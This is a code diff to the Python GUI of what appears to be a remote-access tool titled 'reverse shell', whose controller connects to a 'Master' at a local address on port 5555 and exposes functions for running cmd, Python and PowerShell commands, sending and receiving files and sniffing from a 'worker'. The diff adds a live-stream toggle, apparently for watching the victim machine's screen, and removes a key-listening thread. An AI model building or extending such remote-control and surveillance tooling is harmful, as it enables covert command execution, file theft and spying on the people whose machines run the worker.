@@ -39,7 +39,7 @@ class App:
     def __init__(self):
         self.input_required_functions: dict[str,Callable[[],str]]= {"cmd" : cmd,"python":python,"powershell":powershell,"receive_file":receive_file,"send_file":send_file,"sniff_from_worker":sniff_from_worker}
         self.page: ft.Page | None = None
-        self.master = Master("10.0.0.10",5555)
+        self.master = Master("10.0.0.6",5555)
         self.master.connect()
         self.title = ft.Container(
             content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
@@ -81,6 +81,7 @@ class App:
             columns=[
                 ft.DataColumn(ft.Text("output:", size=30, italic=True, weight=FontWeight.BOLD,
                                       text_align=ft.TextAlign.LEFT)),
+
             ]
 
         )
@@ -95,7 +96,16 @@ class App:
         )
         self.input_help_dlg = ft.AlertDialog(title="how to input for your specific function:")
         self.exit = False
-        self.listen_thread = threading.Thread(target=listen_to_keys, daemon=True)
+        self.livestream = ft.Checkbox(label="live stream", on_change=self.live_steam_pressed)
+        self.master.on_stream_stop = self.live_stream_stopped
+        threading.Thread(target=self.master.show_stream, daemon=True).start()
+
+    def live_stream_stopped(self):
+            self.livestream.value = False
+            self.page.update()
+
+    def live_steam_pressed(self,e):
+        self.master.streaming = self.livestream.value
 
     def exit_button_pressed(self,e):
         self.exit = True
@@ -192,6 +202,7 @@ class App:
                               #     padding=10,
                               #     border_radius=10,
                               # ),
+                              self.livestream,
                               ft.VerticalDivider(width=6, thickness=3),
                               ft.Column(
                                   spacing=10,
